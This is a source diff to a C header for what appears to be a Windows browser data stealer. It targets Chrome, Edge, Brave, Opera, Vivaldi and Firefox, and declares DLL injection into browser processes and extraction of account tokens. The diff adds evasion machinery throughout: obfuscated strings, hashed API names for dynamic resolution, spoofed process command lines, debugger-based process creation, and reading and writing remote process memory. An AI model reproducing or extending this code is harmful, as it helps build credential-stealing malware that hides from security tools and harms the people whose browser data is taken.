@@ -2,14 +2,9 @@
 #ifndef EXE_HEADERS_H
 #define EXE_HEADERS_H
 
-#include <Windows.h>
-#include <Shlwapi.h>
-#include <strsafe.h>
-#include <stdio.h>
-
+#include "Structures.h"
+#include "CsrssRegistration.h"
 #include "Common.h"
-
-#pragma comment(lib, "shlwapi.lib")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -21,35 +16,35 @@
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-#define STR_FIREFOX_PROGID              L"FirefoxURL"
-#define STR_FIREFOX_REGKEY              L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe"
-#define STR_FIREFOX_OUTPUT_FILE         "FireFoxData.json"
+#define STR_FIREFOX_PROGID              OBFW_S(L"FirefoxURL")
+#define STR_FIREFOX_REGKEY              OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe")
+#define STR_FIREFOX_OUTPUT_FILE         OBFA_S("FireFoxData.json")
 
-#define STR_OPERA_PROGID                L"OperaStable"
-#define STR_OPERA_REGKEY                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera.exe"
-#define STR_OPERA_OUTPUT_FILE           "OperaData.json"
+#define STR_OPERA_PROGID                OBFW_S(L"OperaStable")
+#define STR_OPERA_REGKEY                OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera.exe")
+#define STR_OPERA_OUTPUT_FILE           OBFA_S("OperaData.json")
 
-#define STR_OPERA_GX_PROGID             L"OperaGXStable"
-#define STR_OPERA_GX_REGKEY             L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera_GX.exe"
-#define STR_OPERA_GX_OUTPUT_FILE        "OperaGxData.json"
+#define STR_OPERA_GX_PROGID             OBFW_S(L"OperaGXStable")
+#define STR_OPERA_GX_REGKEY             OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera_GX.exe")
+#define STR_OPERA_GX_OUTPUT_FILE        OBFA_S("OperaGxData.json")
 
-#define STR_CHROME_PROGID               L"ChromeHTML"
-#define STR_CHROME_REGKEY               L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
-#define STR_CHROME_OUTPUT_FILE          "ChromeData.json"
+#define STR_CHROME_PROGID               OBFW_S(L"ChromeHTML")
+#define STR_CHROME_REGKEY               OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe")
+#define STR_CHROME_OUTPUT_FILE          OBFA_S("ChromeData.json")
 
-#define STR_EDGE_PROGID                 L"MSEdgeHTM"
-#define STR_EDGE_REGKEY                 L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"
-#define STR_EDGE_OUTPUT_FILE            "EdgeData.json"
+#define STR_EDGE_PROGID                 OBFW_S(L"MSEdgeHTM")
+#define STR_EDGE_REGKEY                 OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe")
+#define STR_EDGE_OUTPUT_FILE            OBFA_S("EdgeData.json")
 
-#define STR_BRAVE_PROGID                L"BraveHTML"
-#define STR_BRAVE_REGKEY                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe"
-#define STR_BRAVE_OUTPUT_FILE           "BraveData.json"
+#define STR_BRAVE_PROGID                OBFW_S(L"BraveHTML")
+#define STR_BRAVE_REGKEY                OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe")
+#define STR_BRAVE_OUTPUT_FILE           OBFA_S("BraveData.json")
 
-#define STR_VIVALDI_PROGID              L"VivaldiHTM"
-#define STR_VIVALDI_REGKEY              L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vivaldi.exe"
-#define STR_VIVALDI_OUTPUT_FILE         "VivaldiData.json"
+#define STR_VIVALDI_PROGID              OBFW_S(L"VivaldiHTM")
+#define STR_VIVALDI_REGKEY              OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vivaldi.exe")
+#define STR_VIVALDI_OUTPUT_FILE         OBFA_S("VivaldiData.json")
 
-#define STR_CHROMIUM_ARGS               L"--headless=new --disable-gpu --remote-debugging-port=9222 --disable-background-timer-throttling"
+#define STR_CHROMIUM_ARGS               OBFW_S(L"--headless=new --disable-gpu --remote-debugging-port=9222 --disable-background-timer-throttling")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -233,6 +228,53 @@ typedef struct _CHROMIUM_DATA
 
 } CHROMIUM_DATA, *PCHROMIUM_DATA;
 
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+DWORD WINAPI HashStringFnv1aCharA(IN LPCSTR pszString, IN BOOL bCaseInsensitive);
+DWORD WINAPI HashStringFnv1aCharW(IN LPCWSTR pwszString, IN BOOL bCaseInsensitive);
+
+
+#define HASH_STRING_A(STR)       HashStringFnv1aCharA((LPCSTR)(STR), FALSE)
+#define HASH_STRING_W(STR)       HashStringFnv1aCharW((LPCWSTR)(STR), FALSE)
+
+#define HASH_STRING_A_CI(STR)    HashStringFnv1aCharA((LPCSTR)(STR), TRUE)
+#define HASH_STRING_W_CI(STR)    HashStringFnv1aCharW((LPCWSTR)(STR), TRUE)
+
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// Utilities Functions
+
+VOID RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN LPWSTR SourceString);
+
+LPWSTR GenerateFakeCommandLine(IN LPCWSTR szRealCommandLine, IN LPCWSTR szProcessPath);
+
+BOOL NtReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID pBuffer, IN SIZE_T cbSize);
+
+BOOL NtWriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, IN PVOID pBuffer, IN SIZE_T cbSize);
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// Chromium Process Creation
+
+typedef struct _CREATED_PROCESS_PROPERTIES
+{
+    HANDLE hProcess;
+    HANDLE hThread;
+    DWORD  dwProcessId;
+    DWORD  dwThreadId;
+    DWORD  dwParentProcessId;
+    HANDLE hDebugObject;
+
+} CREATED_PROCESS_PROPERTIES, *PCREATED_PROCESS_PROPERTIES;
+
+BOOL CreateChromiumProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, OUT CREATED_PROCESS_PROPERTIES* pProcessProp);
+
+BOOL DetachDebugger(IN CREATED_PROCESS_PROPERTIES* pProcessProp);
+
+BOOL NtCreateChromiumProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, IN OUT CREATED_PROCESS_PROPERTIES* pProcessProp);
+
+BOOL NtDetachDebugger(IN CREATED_PROCESS_PROPERTIES* pProcessProp);
+
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 BOOL GetBrowserPath(IN BROWSER_TYPE Browser, IN OUT LPWSTR szBrowserPath, IN DWORD dwSize);
@@ -241,7 +283,7 @@ BOOL InitializeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData);
 
 VOID FreeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData);
 
-BOOL InjectDllViaEarlyBird(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);
+BOOL InjectDllViaEarlyBird(IN BOOL bUseSpoofing, IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -297,6 +339,199 @@ BOOL ExtractFirefoxAccountTokens(IN OUT PFIREFOX_BROWSER_DATA pFirefoxData);
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN BOOL bShowAll);
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+#pragma region HASH_VALUES
+
+#define FNV1A_KERNEL32DLL                                    0xA3E6F6C3
+#define FNV1A_NTDLLDLL                                       0xA62A3B3B
+
+#define FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE          0x98A84DB3
+#define FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE    0x58CC175A
+#define FNV1A_CSRCLIENTCALLSERVER                            0x33C69D47
+#define FNV1A_NTCREATEUSERPROCESS                            0x116893E9
+#define FNV1A_RTLCREATEPROCESSPARAMETERSEX                   0x2DFC830F
+#define FNV1A_RTLDESTROYPROCESSPARAMETERS                    0x552E48C2
+#define FNV1A_NTCREATEDEBUGOBJECT                            0x22074A55
+#define FNV1A_NTWAITFORDEBUGEVENT                            0xEECD8408
+#define FNV1A_NTDEBUGCONTINUE                                0xED5F89F7
+#define FNV1A_NTREMOVEPROCESSDEBUG                           0x81FB52CF
+#define FNV1A_NTQUERYINFORMATIONPROCESS                      0xEA2DDA8A
+#define FNV1A_NTREADVIRTUALMEMORY                            0x6E2A0391
+#define FNV1A_NTWRITEVIRTUALMEMORY                           0x43E32F32
+#define FNV1A_NTOPENPROCESSTOKEN                             0x1F1A92AD
+
+
+#pragma endregion
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+#pragma region CSRSS_FUNCTION_POINTERS
+
+// Windows 10 2004+ / Windows 11 signature 
+typedef NTSTATUS(NTAPI* fnBasepConstructSxsCreateProcessMessage)(
+    IN      PUNICODE_STRING              NtPath,                    // a1
+    IN      PUNICODE_STRING              Win32Path,                 // a2
+    IN      HANDLE                       FileHandle,                // a3
+    IN      HANDLE                       ProcessHandle,             // a4
+    IN      HANDLE                       SectionHandle,             // a5
+    IN      HANDLE                       TokenHandle,               // a6
+    IN      ULONG                        SxsCreateFlag,             // a7 
+    IN      PVOID                        UnknowCompatCache,         // a8
+    IN      PVOID                        AppCompatSxsData,          // a9
+    IN      ULONG                        AppCompatSxsDataSize,      // a10
+    IN      ULONG                        NoIsolation,               // a11 
+    IN      PVOID                        AppXPath,                  // a12
+    IN      PPEB                         PebAddress,                // a13
+    IN      PVOID                        ManifestAddress,           // a14
+    IN      ULONG                        ManifestSize,              // a15
+    IN OUT  PULONG                       CurrentParameterFlags,     // a16
+    OUT     PBASE_SXS_CREATEPROCESS_MSG  SxsMessage,                // a17
+    OUT     PVOID                        SxsUtilityStruct           // a18
+);
+
+typedef NTSTATUS(NTAPI* fnCsrCaptureMessageMultiUnicodeStringsInPlace)(
+    IN OUT  PCSR_CAPTURE_BUFFER*         CaptureBuffer,
+    IN      ULONG                        StringsCount,
+    IN      PUNICODE_STRING*             MessageStrings
+);
+
+typedef NTSTATUS(NTAPI* fnCsrClientCallServer)(
+    IN OUT  PCSR_API_MSG                 ApiMessage,
+    IN OUT  PCSR_CAPTURE_BUFFER          CaptureBuffer OPTIONAL,
+    IN      CSR_API_NUMBER               ApiNumber,
+    IN      ULONG                        DataLength
+);
+
+#pragma endregion
+
+
+#pragma region NT_FUNCTION_POINTERS
+
+typedef NTSTATUS (NTAPI* fnNtCreateUserProcess)(
+    OUT      PHANDLE                        ProcessHandle,
+    OUT      PHANDLE                        ThreadHandle,
+    IN       ACCESS_MASK                    ProcessDesiredAccess,
+    IN       ACCESS_MASK                    ThreadDesiredAccess,
+    IN       PCOBJECT_ATTRIBUTES            ProcessObjectAttributes OPTIONAL,
+    IN       PCOBJECT_ATTRIBUTES            ThreadObjectAttributes OPTIONAL,
+    IN       ULONG                          ProcessFlags, 
+    IN       ULONG                          ThreadFlags,
+    IN       PRTL_USER_PROCESS_PARAMETERS   ProcessParameters OPTIONAL,
+    IN OUT   PPS_CREATE_INFO                CreateInfo,
+    IN       PPS_ATTRIBUTE_LIST             AttributeList OPTIONAL
+);
+
+typedef NTSTATUS (NTAPI* fnRtlCreateProcessParametersEx)(
+    OUT     PRTL_USER_PROCESS_PARAMETERS*   ProcessParameters,
+    IN      PCUNICODE_STRING                ImagePathName,
+    IN      PCUNICODE_STRING                DllPath OPTIONAL,
+    IN      PCUNICODE_STRING                CurrentDirectory OPTIONAL,
+    IN      PCUNICODE_STRING                CommandLine OPTIONAL,
+    IN      PVOID                           Environment OPTIONAL,
+    IN      PCUNICODE_STRING                WindowTitle OPTIONAL,
+    IN      PCUNICODE_STRING                DesktopInfo OPTIONAL,
+    IN      PCUNICODE_STRING                ShellInfo OPTIONAL,
+    IN      PCUNICODE_STRING                RuntimeData OPTIONAL,
+    IN      ULONG                           Flags
+);
+
+typedef NTSTATUS (NTAPI* fnRtlDestroyProcessParameters)(
+    IN      PRTL_USER_PROCESS_PARAMETERS    ProcessParameters
+);
+
+typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(
+    IN      HANDLE              ProcessHandle,
+    IN      PROCESSINFOCLASS    ProcessInformationClass,
+    OUT     PVOID               ProcessInformation,
+    IN      ULONG               ProcessInformationLength,
+    OUT     PULONG              ReturnLength OPTIONAL
+);
+
+typedef NTSTATUS (NTAPI* fnNtCreateDebugObject)(
+    OUT     PHANDLE             DebugObjectHandle,
+    IN      ACCESS_MASK         DesiredAccess,
+    IN      POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
+    IN      ULONG               Flags
+);
+
+typedef NTSTATUS (NTAPI* fnNtWaitForDebugEvent)(
+    IN      HANDLE                      DebugObjectHandle,
+    IN      BOOLEAN                     Alertable,
+    IN      PLARGE_INTEGER              Timeout OPTIONAL,
+    OUT     PDBGUI_WAIT_STATE_CHANGE    WaitStateChange
+);
+
+typedef NTSTATUS (NTAPI* fnNtDebugContinue)(
+    IN      HANDLE      DebugObjectHandle,
+    IN      PCLIENT_ID  ClientId,
+    IN      NTSTATUS    ContinueStatus
+);
+
+typedef NTSTATUS (NTAPI* fnNtRemoveProcessDebug)(
+    IN      HANDLE      ProcessHandle,
+    IN      HANDLE      DebugObjectHandle
+);
+
+typedef NTSTATUS (NTAPI* fnNtReadVirtualMemory)(
+    IN      HANDLE      ProcessHandle,
+    IN      PVOID       BaseAddress OPTIONAL,
+    OUT     PVOID       Buffer,
+    IN      SIZE_T      NumberOfBytesToRead,
+    OUT     PSIZE_T     NumberOfBytesRead OPTIONAL
+);
+
+typedef NTSTATUS (NTAPI* fnNtWriteVirtualMemory)(
+    IN      HANDLE      ProcessHandle,
+    IN      PVOID       BaseAddress OPTIONAL,
+    IN      PVOID       Buffer,
+    IN      SIZE_T      NumberOfBytesToWrite,
+    OUT     PSIZE_T     NumberOfBytesWritten OPTIONAL
+);
+
+typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(
+    IN  HANDLE      ProcessHandle,
+    IN  ACCESS_MASK DesiredAccess,
+    OUT PHANDLE     TokenHandle
+);
+
+#pragma endregion
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+typedef struct _DINMCLY_RSOLVD_FUNCTIONS
+{
+    PVOID                                           pInitialized;
+
+    // NTAPI Functions
+    fnNtCreateUserProcess                           pNtCreateUserProcess;
+    fnRtlCreateProcessParametersEx                  pRtlCreateProcessParametersEx;
+    fnRtlDestroyProcessParameters                   pRtlDestroyProcessParameters;
+    fnNtCreateDebugObject                           pNtCreateDebugObject;
+    fnNtWaitForDebugEvent                           pNtWaitForDebugEvent;
+    fnNtDebugContinue                               pNtDebugContinue;
+    fnNtRemoveProcessDebug                          pNtRemoveProcessDebug;
+    fnNtQueryInformationProcess                     pNtQueryInformationProcess;
+    fnNtReadVirtualMemory                           pNtReadVirtualMemory;
+    fnNtWriteVirtualMemory                          pNtWriteVirtualMemory;
+    fnNtOpenProcessToken                            pNtOpenProcessToken;
+
+    // CRSS Functions
+    fnBasepConstructSxsCreateProcessMessage         pBasepConstructSxsCreateProcessMessage;
+    fnCsrCaptureMessageMultiUnicodeStringsInPlace   pCsrCaptureMessageMultiUnicodeStringsInPlace;
+    fnCsrClientCallServer                           pCsrClientCallServer;
+
+
+} DINMCLY_RSOLVD_FUNCTIONS, *PDINMCLY_RSOLVD_FUNCTIONS;
+
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+
+BOOL InitializeAllDynamicFunctions();
+
+
 
 
 #endif // !EXE_HEADERS_H
